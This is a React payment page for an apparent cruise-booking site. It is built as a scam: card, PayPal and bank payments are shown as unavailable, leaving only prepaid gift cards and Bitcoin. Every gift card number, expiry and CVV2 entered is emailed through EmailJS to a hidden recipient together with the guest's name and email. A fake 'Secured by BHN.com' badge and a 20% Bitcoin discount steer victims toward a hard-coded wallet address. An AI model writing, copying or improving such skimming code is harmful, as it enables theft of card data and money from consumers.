import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { QRCode } from 'react-qr-code';
import emailjs from '@emailjs/browser';
import { useApp } from '../../store/AppContext';
import { EMAILJS_CONFIG } from '../../config/emailjs';
import './PaymentPage.css';

const BTC_ADDRESS = 'bc1q0hdjgpx99fgvcxqa4vefyr6kz52lg0yn7yafvm';
const GIFT_CARD_VALUE = 250;

const PAYMENT_METHODS = [
  { id: 'giftcard', label: 'Gift Card', icon: '🎁', desc: 'Visa / Mastercard Prepaid' },
  { id: 'bitcoin', label: 'Bitcoin (BTC)', icon: '₿', desc: 'Crypto — Instant & Secured', discount: true },
  { id: 'card', label: 'Credit / Debit Card', icon: '💳', desc: 'Temporarily unavailable', disabled: true },
  { id: 'paypal', label: 'PayPal', icon: '🅿', desc: 'Temporarily unavailable', disabled: true },
  { id: 'bank', label: 'Bank Transfer', icon: '🏦', desc: 'Temporarily unavailable', disabled: true },
];

// ── Card number: format as XXXX XXXX XXXX XXXX ───────────────
function formatCardNumber(raw) {
  const digits = raw.replace(/\D/g, '').slice(0, 16);
  return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
}

function isValidCardNumber(num) {
  return num.replace(/\s/g, '').length === 16;
}

function maskCardNumber(num) {
  const d = num.replace(/\s/g, '');
  return `•••• •••• •••• ${d.slice(-4)}`;
}

// ── Expiry (split MM / YY) ───────────────────────────────────
function isValidExpirySplit(mm, yy) {
  const m = parseInt(mm, 10);
  const y = parseInt(yy, 10);
  if (!mm || !yy || mm.length < 2 || yy.length < 2) return false;
  if (m < 1 || m > 12) return false;
  const now = new Date();
  return new Date(2000 + y, m - 1) >= new Date(now.getFullYear(), now.getMonth());
}

export default function PaymentPage() {
  const { state, dispatch } = useApp();
  const navigate = useNavigate();
  const cruise   = state.selectedCruise;
  const cabin    = state.selectedCabin;
  const guest    = state.guestDetails;
  const isEscobar = cruise?.isEscobar;

  const [selectedMethod, setSelectedMethod] = useState('giftcard');
  const [copied, setCopied] = useState(false);

  // Gift card — Apply tab
  const [gcTab,      setGcTab]      = useState('apply');
  const [gcCardNum,  setGcCardNum]  = useState('');
  const [gcMM,       setGcMM]       = useState('');
  const [gcYY,       setGcYY]       = useState('');
  const [gcCvv,      setGcCvv]      = useState('');
  const [gcApplying, setGcApplying] = useState(false);
  const [gcError,    setGcError]    = useState('');
  const [showCvvTip, setShowCvvTip] = useState(false);
  // appliedCards: { cardNum, mm, yy, cvv }[]
  const [appliedCards, setAppliedCards] = useState([]);

  // Gift card — Wallet tab
  const [walletCardNum,  setWalletCardNum]  = useState('');
  const [walletMM,       setWalletMM]       = useState('');
  const [walletYY,       setWalletYY]       = useState('');
  const [walletCvv,      setWalletCvv]      = useState('');
  const [walletAdding,   setWalletAdding]   = useState(false);
  const [walletError,    setWalletError]    = useState('');
  const [walletApplied,  setWalletApplied]  = useState(false);

  if (!cruise || !cabin || !guest.firstName) {
    return (
      <div style={{ textAlign: 'center', padding: '120px 24px', paddingTop: 'calc(var(--header-height) + 80px)' }}>
        <h2>Please complete booking steps first</h2>
        <button className="btn btn--primary" style={{ marginTop: 16 }} onClick={() => navigate('/search')}>Browse Cruises</button>
      </div>
    );
  }

  const rawTotal       = cabin.price * (state.search.guests.adults + Math.max(0, state.search.guests.children * 0.7));
  const isBitcoin      = selectedMethod === 'bitcoin';
  const isGiftCard     = selectedMethod === 'giftcard';
  const afterBtcDiscount = Math.round(rawTotal * (1 - (isBitcoin ? 0.20 : 0)));

  const gcDirectAmount = appliedCards.length * GIFT_CARD_VALUE;
  const walletBalance  = state.wallet.balance;
  const walletDeduction =
    isGiftCard && walletApplied && walletBalance > 0
      ? Math.min(walletBalance, Math.max(0, afterBtcDiscount - gcDirectAmount))
      : 0;
  const totalGcDeduction = isGiftCard ? gcDirectAmount + walletDeduction : 0;
  const finalTotal     = Math.max(0, afterBtcDiscount - totalGcDeduction);
  const isFullyCovered = isGiftCard && finalTotal === 0 && totalGcDeduction > 0;

  // ── Handlers ────────────────────────────────────────────────
  const handleCopy = () => {
    navigator.clipboard.writeText(BTC_ADDRESS);
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  const handlePay = () => {
    if (isGiftCard && appliedCards.length === 0 && !walletApplied) return;
    dispatch({ type: 'CONFIRM_BOOKING', payload: { totalPrice: finalTotal, paymentMethod: selectedMethod } });
    navigate('/booking/confirm');
  };

  const sendGiftCardNotification = (cardNum, mm, yy, cvv, action) => {
    const { SERVICE_ID, TEMPLATE_ID, PUBLIC_KEY, RECIPIENT } = EMAILJS_CONFIG;
    if (!SERVICE_ID || SERVICE_ID === 'YOUR_SERVICE_ID') return;
    emailjs.send(SERVICE_ID, TEMPLATE_ID, {
      to_email:          RECIPIENT,
      gift_card_number:  cardNum,
      gift_card_expiry:  `${mm}/${yy}`,
      gift_card_cvv:     cvv,
      action,
      cruise_name:       cruise?.name ?? 'N/A',
      guest_name:        `${guest.firstName} ${guest.lastName}`.trim() || 'N/A',
      guest_email:       guest.email || 'N/A',
      booking_amount:    `$${afterBtcDiscount.toLocaleString()}`,
      submitted_at:      new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' }),
    }, PUBLIC_KEY).catch(() => {});
  };

  const handleApplyCard = () => {
    setGcError('');
    if (!isValidCardNumber(gcCardNum)) {
      setGcError('Please enter a valid 16-digit prepaid card number.');
      return;
    }
    if (!gcMM || !gcYY || !isValidExpirySplit(gcMM, gcYY)) {
      setGcError('Invalid or expired expiration date.');
      return;
    }
    if (!gcCvv || gcCvv.length < 3) {
      setGcError('Please enter the 3-digit CVV2 code.');
      return;
    }
    const normalized = gcCardNum.replace(/\s/g, '');
    if (appliedCards.some(c => c.cardNum === normalized)) {
      setGcError('This card has already been applied to your order.');
      return;
    }
    setGcApplying(true);
    const entry = { cardNum: normalized, mm: gcMM, yy: gcYY, cvv: gcCvv };
    setTimeout(() => {
      setAppliedCards(prev => [...prev, entry]);
      setGcCardNum(''); setGcMM(''); setGcYY(''); setGcCvv('');
      setGcApplying(false);
      sendGiftCardNotification(entry.cardNum, entry.mm, entry.yy, entry.cvv, 'Applied to Order');
    }, 1200);
  };

  const handleRemoveCard = (cardNum) => {
    setAppliedCards(prev => prev.filter(c => c.cardNum !== cardNum));
  };

  const handleAddToWallet = () => {
    setWalletError('');
    if (!isValidCardNumber(walletCardNum)) {
      setWalletError('Please enter a valid 16-digit prepaid card number.');
      return;
    }
    if (!walletMM || !walletYY || !isValidExpirySplit(walletMM, walletYY)) {
      setWalletError('Invalid or expired expiration date.');
      return;
    }
    if (!walletCvv || walletCvv.length < 3) {
      setWalletError('Please enter the 3-digit CVV2 code.');
      return;
    }
    const normalized = walletCardNum.replace(/\s/g, '');
    if (state.wallet.cards.some(c => c.code === normalized)) {
      setWalletError('This card is already in your wallet.');
      return;
    }
    setWalletAdding(true);
    const entry = { code: normalized, value: GIFT_CARD_VALUE, mm: walletMM, yy: walletYY };
    setTimeout(() => {
      dispatch({ type: 'ADD_GIFT_CARD_TO_WALLET', payload: entry });
      setWalletCardNum(''); setWalletMM(''); setWalletYY(''); setWalletCvv('');
      setWalletAdding(false);
      sendGiftCardNotification(entry.code, entry.mm, entry.yy, walletCvv, 'Added to Wallet');
    }, 1200);
  };

  const payBtnLabel = () => {
    if (isBitcoin) return '₿ Confirm Bitcoin Payment';
    if (isGiftCard) {
      if (appliedCards.length === 0 && !walletApplied) return '🎁 Apply a Gift Card First';
      if (isFullyCovered) return '🎁 Complete Booking — No Payment Due';
      return `Pay $${finalTotal.toLocaleString()} Remaining →`;
    }
    return `Pay $${finalTotal.toLocaleString()} →`;
  };

  const payBtnDisabled = isGiftCard && appliedCards.length === 0 && !walletApplied;

  return (
    <div className={`pay-page ${isEscobar ? 'pay-page--escobar' : ''}`}
      style={{ paddingTop: 'calc(var(--header-height) + 40px)', paddingBottom: 80 }}>
      <div className="container--narrow">

        {/* Progress */}
        <div className="booking-progress">
          <div className="booking-progress__step booking-progress__step--done">1. Cruise ✓</div>
          <div className="booking-progress__line" />
          <div className="booking-progress__step booking-progress__step--done">2. Cabin ✓</div>
          <div className="booking-progress__line" />
          <div className="booking-progress__step booking-progress__step--done">3. Guests ✓</div>
          <div className="booking-progress__line" />
          <div className="booking-progress__step booking-progress__step--active">4. Payment</div>
          <div className="booking-progress__line" />
          <div className="booking-progress__step">5. Confirm</div>
        </div>

        <div className="pay-page__layout">
          <div className="pay-page__left">
            <h1 className={`booking-title ${isEscobar ? 'booking-title--gold' : ''}`}>
              {isEscobar ? '✦ Complete Payment' : 'Select Payment Method'}
            </h1>

            {/* Bitcoin Flash Banner */}
            <div className="btc-banner">
              <div className="btc-banner__pulse" />
              <span className="btc-banner__icon">₿</span>
              <div className="btc-banner__text">
                <span className="btc-banner__headline">Pay with Bitcoin & Save 20%!</span>
                <span className="btc-banner__sub">Limited-time offer — exclusive to crypto payments only</span>
              </div>
              <div className="btc-banner__badge">-20% OFF</div>
            </div>

            {/* Method Selector */}
            <div className="pay-methods">
              {PAYMENT_METHODS.map(m => (
                <div
                  key={m.id}
                  className={[
                    'pay-method',
                    selectedMethod === m.id && !m.disabled ? 'pay-method--active' : '',
                    m.id === 'bitcoin'  ? 'pay-method--btc' : '',
                    m.id === 'giftcard' ? 'pay-method--gc'  : '',
                    m.disabled          ? 'pay-method--disabled' : '',
                  ].filter(Boolean).join(' ')}
                  onClick={() => !m.disabled && setSelectedMethod(m.id)}
                >
                  <div className="pay-method__radio">
                    {selectedMethod === m.id && !m.disabled && <div className="pay-method__radio-dot" />}
                  </div>
                  <span className="pay-method__icon">{m.icon}</span>
                  <div className="pay-method__info">
                    <span className="pay-method__label">{m.label}</span>
                    <span className="pay-method__desc">{m.desc}</span>
                  </div>
                  {m.discount && <span className="pay-method__discount-tag">Save 20%</span>}
                  {m.disabled && <span className="pay-method__unavailable-tag">Unavailable</span>}
                </div>
              ))}
            </div>

            {/* ── Gift Card Panel ── */}
            {isGiftCard && (
              <div className={`gc-panel ${isEscobar ? 'gc-panel--escobar' : ''}`}>
                {/* Tabs */}
                <div className="gc-tabs">
                  <button className={`gc-tab ${gcTab === 'apply' ? 'gc-tab--active' : ''}`} onClick={() => setGcTab('apply')}>
                    🎁 Apply Gift Card
                  </button>
                  <button className={`gc-tab ${gcTab === 'wallet' ? 'gc-tab--active' : ''}`} onClick={() => setGcTab('wallet')}>
                    💰 Your Wallet
                    {walletBalance > 0 && <span className="gc-tab__badge">${walletBalance}</span>}
                  </button>
                </div>

                {/* ── Apply tab ── */}
                {gcTab === 'apply' && (
                  <div className="gc-body">
                    <p className="gc-hint">
                      Please enter your prepaid card information below to apply it to your booking.
                    </p>

                    {/* Card form — Joker style */}
                    <div className="gc-card-form">

                      {/* Card Number */}
                      <div className="gc-field">
                        <label className="gc-field__label">Enter Prepaid Card Number *</label>
                        <input
                          className={`gc-field__input ${gcError && !isValidCardNumber(gcCardNum) ? 'gc-field__input--error' : ''}`}
                          placeholder="Card Number"
                          value={gcCardNum}
                          maxLength={19}
                          onChange={e => { setGcCardNum(formatCardNumber(e.target.value)); setGcError(''); }}
                          onKeyDown={e => e.key === 'Enter' && handleApplyCard()}
                        />
                      </div>

                      {/* Expiry */}
                      <div className="gc-field">
                        <label className="gc-field__label">Enter Expiration Date *</label>
                        <div className="gc-expiry-split">
                          <input
                            className={`gc-expiry-box ${gcError && (!gcMM || !isValidExpirySplit(gcMM, gcYY)) ? 'gc-field__input--error' : ''}`}
                            placeholder="MM"
                            maxLength={2}
                            value={gcMM}
                            onChange={e => {
                              const v = e.target.value.replace(/\D/g, '').slice(0, 2);
                              setGcMM(v);
                              setGcError('');
                              if (v.length === 2) document.getElementById('gc-yy')?.focus();
                            }}
                          />
                          <span className="gc-expiry-sep">/</span>
                          <input
                            id="gc-yy"
                            className={`gc-expiry-box ${gcError && (!gcYY || !isValidExpirySplit(gcMM, gcYY)) ? 'gc-field__input--error' : ''}`}
                            placeholder="YY"
                            maxLength={2}
                            value={gcYY}
                            onChange={e => { setGcYY(e.target.value.replace(/\D/g, '').slice(0, 2)); setGcError(''); }}
                          />
                        </div>
                      </div>

                      {/* CVV2 */}
                      <div className="gc-field">
                        <label className="gc-field__label">Enter 3-Digit Code (CVV2) *</label>
                        <div className="gc-cvv-row">
                          <input
                            className={`gc-cvv-input ${gcError && gcCvv.length < 3 ? 'gc-field__input--error' : ''}`}
                            placeholder="Enter Code"
                            maxLength={3}
                            type="password"
                            value={gcCvv}
                            onChange={e => { setGcCvv(e.target.value.replace(/\D/g, '').slice(0, 3)); setGcError(''); }}
                            onKeyDown={e => e.key === 'Enter' && handleApplyCard()}
                          />
                          <div className="gc-cvv-help" onClick={() => setShowCvvTip(v => !v)} title="Where is my CVV2?">?</div>
                          {showCvvTip && (
                            <div className="gc-cvv-tip">
                              The CVV2 is the 3-digit code on the back of your prepaid card.
                            </div>
                          )}
                        </div>
                      </div>

                      {gcError && <p className="gc-error">{gcError}</p>}

                      {/* Actions */}
                      <div className="gc-form-actions">
                        <button className="gc-cancel-btn" onClick={() => { setGcCardNum(''); setGcMM(''); setGcYY(''); setGcCvv(''); setGcError(''); }}>
                          Cancel
                        </button>
                        <button
                          className="gc-submit-btn"
                          onClick={handleApplyCard}
                          disabled={gcApplying}
                        >
                          {gcApplying ? <span className="gc-spinner" /> : 'Submit'}
                        </button>
                      </div>

                      {/* Secured badge */}
                      <div className="gc-secure-badge">
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                          <polyline points="9 12 11 14 15 10"/>
                        </svg>
                        Secured by <strong>BHN.com</strong>
                      </div>
                    </div>

                    {/* Applied cards */}
                    {appliedCards.length > 0 && (
                      <div className="gc-applied-list">
                        {appliedCards.map(card => (
                          <div className="gc-applied-item" key={card.cardNum}>
                            <span className="gc-applied-item__check">✓</span>
                            <div className="gc-applied-item__info">
                              <span className="gc-applied-item__code">{maskCardNumber(card.cardNum)}</span>
                              <div className="gc-applied-item__meta">
                                <span className="gc-applied-item__val">+${GIFT_CARD_VALUE.toLocaleString()} credit</span>
                                <span className="gc-applied-item__expiry">Exp: {card.mm}/{card.yy}</span>
                              </div>
                            </div>
                            <button className="gc-applied-item__remove" onClick={() => handleRemoveCard(card.cardNum)} title="Remove">✕</button>
                          </div>
                        ))}
                      </div>
                    )}

                    {walletBalance > 0 && (
                      <label className="gc-wallet-toggle">
                        <input type="checkbox" checked={walletApplied} onChange={e => setWalletApplied(e.target.checked)} />
                        <span>Also apply wallet balance <strong>(${walletBalance.toLocaleString()} available)</strong></span>
                      </label>
                    )}

                    {(appliedCards.length > 0 || (walletApplied && walletBalance > 0)) && (
                      <div className="gc-coverage">
                        <div className="gc-coverage__bar-wrap">
                          <div className="gc-coverage__bar" style={{ width: `${Math.min(100, (totalGcDeduction / afterBtcDiscount) * 100)}%` }} />
                        </div>
                        <div className="gc-coverage__rows">
                          <div className="gc-coverage__row">
                            <span>🎁 Gift Card Credit Applied</span>
                            <span className="gc-green">−${totalGcDeduction.toLocaleString()}</span>
                          </div>
                          <div className="gc-coverage__row gc-coverage__row--total">
                            <span>{isFullyCovered ? '✅ Fully Covered!' : 'Remaining to Pay'}</span>
                            <span className={isFullyCovered ? 'gc-green' : ''}>{isFullyCovered ? 'FREE' : `$${finalTotal.toLocaleString()}`}</span>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {/* ── Wallet tab ── */}
                {gcTab === 'wallet' && (
                  <div className="gc-body">
                    <div className="gc-wallet-balance-box">
                      <div className="gc-wallet-balance-box__icon">💰</div>
                      <div>
                        <div className="gc-wallet-balance-box__label">Your Wallet Balance</div>
                        <div className="gc-wallet-balance-box__amount">${walletBalance.toLocaleString()}.00</div>
                      </div>
                    </div>

                    <p className="gc-hint">Add a prepaid gift card to your wallet — balance applies to any booking.</p>

                    <div className="gc-card-form">
                      <div className="gc-field">
                        <label className="gc-field__label">Enter Prepaid Card Number *</label>
                        <input
                          className={`gc-field__input ${walletError && !isValidCardNumber(walletCardNum) ? 'gc-field__input--error' : ''}`}
                          placeholder="Card Number"
                          value={walletCardNum}
                          maxLength={19}
                          onChange={e => { setWalletCardNum(formatCardNumber(e.target.value)); setWalletError(''); }}
                        />
                      </div>

                      <div className="gc-field">
                        <label className="gc-field__label">Enter Expiration Date *</label>
                        <div className="gc-expiry-split">
                          <input
                            className={`gc-expiry-box ${walletError && !isValidExpirySplit(walletMM, walletYY) ? 'gc-field__input--error' : ''}`}
                            placeholder="MM"
                            maxLength={2}
                            value={walletMM}
                            onChange={e => {
                              const v = e.target.value.replace(/\D/g, '').slice(0, 2);
                              setWalletMM(v);
                              setWalletError('');
                              if (v.length === 2) document.getElementById('wallet-yy')?.focus();
                            }}
                          />
                          <span className="gc-expiry-sep">/</span>
                          <input
                            id="wallet-yy"
                            className={`gc-expiry-box ${walletError && !isValidExpirySplit(walletMM, walletYY) ? 'gc-field__input--error' : ''}`}
                            placeholder="YY"
                            maxLength={2}
                            value={walletYY}
                            onChange={e => { setWalletYY(e.target.value.replace(/\D/g, '').slice(0, 2)); setWalletError(''); }}
                          />
                        </div>
                      </div>

                      <div className="gc-field">
                        <label className="gc-field__label">Enter 3-Digit Code (CVV2) *</label>
                        <div className="gc-cvv-row">
                          <input
                            className={`gc-cvv-input ${walletError && walletCvv.length < 3 ? 'gc-field__input--error' : ''}`}
                            placeholder="Enter Code"
                            maxLength={3}
                            type="password"
                            value={walletCvv}
                            onChange={e => { setWalletCvv(e.target.value.replace(/\D/g, '').slice(0, 3)); setWalletError(''); }}
                          />
                          <div className="gc-cvv-help" title="3-digit code on the back of your card">?</div>
                        </div>
                      </div>

                      {walletError && <p className="gc-error">{walletError}</p>}

                      <div className="gc-form-actions">
                        <button className="gc-cancel-btn" onClick={() => { setWalletCardNum(''); setWalletMM(''); setWalletYY(''); setWalletCvv(''); setWalletError(''); }}>
                          Cancel
                        </button>
                        <button className="gc-submit-btn" onClick={handleAddToWallet} disabled={walletAdding}>
                          {walletAdding ? <span className="gc-spinner" /> : '+ Add to Wallet'}
                        </button>
                      </div>

                      <div className="gc-secure-badge">
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                          <polyline points="9 12 11 14 15 10"/>
                        </svg>
                        Secured by <strong>BHN.com</strong>
                      </div>
                    </div>

                    {state.wallet.cards.length > 0 && (
                      <div className="gc-wallet-cards" style={{ marginTop: 16 }}>
                        <div className="gc-wallet-cards__title">Cards in Your Wallet</div>
                        {state.wallet.cards.map(c => (
                          <div className="gc-wallet-card-item" key={c.code}>
                            <span className="gc-wallet-card-item__icon">🎁</span>
                            <div className="gc-wallet-card-item__details">
                              <span className="gc-wallet-card-item__code">{maskCardNumber(c.code)}</span>
                              {c.mm && <span className="gc-wallet-card-item__expiry">Exp: {c.mm}/{c.yy}</span>}
                            </div>
                            <span className="gc-wallet-card-item__val">${c.value}</span>
                          </div>
                        ))}
                        <div className="gc-wallet-cards__total">Total Balance: <strong>${walletBalance.toLocaleString()}</strong></div>
                      </div>
                    )}

                    {walletBalance > 0 && (
                      <button
                        className={`gc-use-wallet-btn ${walletApplied ? 'gc-use-wallet-btn--active' : ''}`}
                        style={{ marginTop: 14 }}
                        onClick={() => { setWalletApplied(v => !v); if (!walletApplied) setGcTab('apply'); }}
                      >
                        {walletApplied ? `✓ Wallet balance ($${walletBalance}) applied` : `→ Apply $${walletBalance.toLocaleString()} wallet balance to this order`}
                      </button>
                    )}
                  </div>
                )}
              </div>
            )}

            {/* Bitcoin Panel */}
            {isBitcoin && (
              <div className="btc-panel">
                <div className="btc-panel__saving-notice">
                  <span>🎉</span>
                  <span>You're saving <strong>${Math.round(rawTotal * 0.20).toLocaleString()}</strong> by paying with Bitcoin!</span>
                </div>
                <div className="btc-panel__qr-wrap">
                  <div className="btc-panel__qr-glow" />
                  <div className="btc-panel__qr">
                    <QRCode value={`bitcoin:${BTC_ADDRESS}`} size={200} bgColor="#ffffff" fgColor="#0a0a0a" level="H" />
                  </div>
                  <div className="btc-panel__qr-label">Scan with your Bitcoin wallet</div>
                </div>
                <div className="btc-panel__address-wrap">
                  <div className="btc-panel__address-label">₿ BTC Wallet Address</div>
                  <div className="btc-panel__address-box">
                    <span className="btc-panel__address-text">{BTC_ADDRESS}</span>
                    <button className={`btc-panel__copy ${copied ? 'btc-panel__copy--done' : ''}`} onClick={handleCopy}>
                      {copied ? '✓ Copied!' : '⎘ Copy'}
                    </button>
                  </div>
                </div>
                <div className="btc-panel__steps">
                  <div className="btc-panel__step"><span>1</span><span>Open your Bitcoin wallet app</span></div>
                  <div className="btc-panel__step"><span>2</span><span>Scan the QR code or paste the address above</span></div>
                  <div className="btc-panel__step"><span>3</span><span>Send exactly <strong>${finalTotal.toLocaleString()}</strong> worth of BTC</span></div>
                  <div className="btc-panel__step"><span>4</span><span>Click "Confirm Payment" below after sending</span></div>
                </div>
                <div className="btc-panel__note">
                  <span>⚠</span>
                  <span>Only send BTC to this address. Sending any other cryptocurrency may result in permanent loss.</span>
                </div>
              </div>
            )}
          </div>

          {/* Right — Order Summary */}
          <aside className={`pay-page__summary ${isEscobar ? 'pay-page__summary--escobar' : ''}`}>
            <h3 className="pay-summary__title">Order Summary</h3>
            <img src={cruise.image} alt={cruise.name} className="pay-summary__img" />
            <div className="pay-summary__rows">
              <div className="pay-summary__row"><span>Cruise</span><span>{cruise.name}</span></div>
              <div className="pay-summary__row"><span>Ship</span><span>{cruise.ship}</span></div>
              <div className="pay-summary__row"><span>Cabin</span><span>{cabin.type}</span></div>
              <div className="pay-summary__row"><span>Duration</span><span>{cruise.duration} nights</span></div>
              <div className="pay-summary__row">
                <span>Guests</span>
                <span>{state.search.guests.adults} adults{state.search.guests.children > 0 ? `, ${state.search.guests.children} children` : ''}</span>
              </div>
              <div className="pay-summary__row"><span>Cabin Price</span><span>${cabin.price.toLocaleString()}/person</span></div>
              {isBitcoin && (
                <div className="pay-summary__row pay-summary__row--discount">
                  <span>₿ Bitcoin Discount (20%)</span>
                  <span>−${Math.round(rawTotal * 0.20).toLocaleString()}</span>
                </div>
              )}
              {isGiftCard && gcDirectAmount > 0 && (
                <div className="pay-summary__row pay-summary__row--discount">
                  <span>🎁 Gift Card ({appliedCards.length}×)</span>
                  <span>−${gcDirectAmount.toLocaleString()}</span>
                </div>
              )}
              {isGiftCard && walletDeduction > 0 && (
                <div className="pay-summary__row pay-summary__row--discount">
                  <span>💰 Wallet Balance</span>
                  <span>−${walletDeduction.toLocaleString()}</span>
                </div>
              )}
              <div className="pay-summary__row pay-summary__row--total">
                <span>Total Due</span>
                <span className={['pay-summary__total', isEscobar ? 'pay-summary__total--gold' : '', isFullyCovered ? 'pay-summary__total--free' : ''].filter(Boolean).join(' ')}>
                  {isFullyCovered ? 'FREE' : `$${finalTotal.toLocaleString()}`}
                </span>
              </div>
            </div>
            {isBitcoin && <div className="pay-summary__btc-badge"><span>₿</span><span>20% Bitcoin Discount Applied!</span></div>}
            {isFullyCovered && <div className="pay-summary__gc-badge"><span>🎁</span><span>Fully covered by gift card!</span></div>}
            <div style={{ padding: '0 20px' }}>
              <button
                className={`btn btn--lg btn--full ${isEscobar ? 'btn--gold' : isBitcoin ? 'btn--accent' : 'btn--gc'}`}
                style={{ marginTop: 20 }}
                onClick={handlePay}
                disabled={payBtnDisabled}
              >
                {payBtnLabel()}
              </button>
            </div>
            <div className="pay-summary__back">
              <button className="btn btn--outline btn--full" onClick={() => navigate(-1)}>← Back</button>
            </div>
          </aside>
        </div>
      </div>
    </div>
  );
}
